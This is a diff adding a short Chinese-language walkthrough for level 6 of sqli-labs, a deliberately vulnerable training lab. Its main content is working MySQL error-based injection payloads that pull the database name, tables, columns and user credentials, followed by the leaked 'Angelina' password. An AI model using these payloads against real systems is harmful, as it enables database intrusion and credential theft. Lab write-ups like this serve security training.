@@ -1,0 +1,34 @@
+第6关
+
+报错盲注
+
+“号报错，报错无回显
+http://10.1.31.91/sqli-labs/Less-6/?id=1"http://10.1.31.91/sqli-labs/Less-6/?id=1"
+
+使用float报错 注入payload  获取当前数据库
+?id=1" and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
+
+获取表信息
+?id=1" and(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema = 'security' limit 3,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
+找到user表后获取列
+
+获取users表中的columns
+?id=1" and(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(column_name) from information_schema.columns where table_name= 'users' limit 2,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  --+
+
+获取用户密码
+?id=1" and(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  --+
+Duplicate entry '~Angelina:I-kill-you~1' for key 'group_key'
+
+
+闯关成功！！！
+
+
+
+
+
+
+
+
+
+
+
